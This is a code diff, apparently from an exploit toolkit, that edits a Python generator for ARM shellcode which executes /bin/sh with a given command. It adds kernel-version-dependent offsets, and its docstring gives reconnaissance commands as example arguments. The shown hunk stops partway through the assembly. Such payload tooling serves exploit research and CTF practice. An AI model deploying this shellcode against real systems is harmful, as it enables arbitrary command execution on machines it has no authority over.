@@ -1,18 +1,28 @@
 # /bin/sh 
-def generate(cmd='echo hack_the_planet'):
+def generate(cmd='echo hack_the_planet', version=3):
     """Executes /bin/sh with arguments
 
     Args:
         cmd(str): arguments (default: ``echo hack_the_planet``)
                   for example: "uname -a; ps auxwww; netstat -an"
+        version(int): 2 is old linux kernel including 2.x (default: 3)
     """
-    sc = """
-    mov  r0, pc
-    adds r0, #22
-    mov  r4, pc
-    adds r4, #26
-    mov  r5, pc
-    adds r5, #25
+    sc = "mov  r0, pc\n"
+    if int(version) == 2:
+        sc += "adds r0, #20\n"
+    else:
+        sc += "adds r0, #22\n"
+    sc += "mov  r4, pc\n"
+    if int(version) == 2:
+        sc += "adds r4, #24\n"
+    else:
+        sc += "adds r4, #26\n"
+    sc += "mov  r5, pc\n"
+    if int(version) == 2:
+        sc += "adds r5, #23\n"
+    else:
+        sc += "adds r5, #25\n"
+    sc += """
     subs r6, r6, r6
     push {r0, r4, r5, r6}
     mov r1, sp
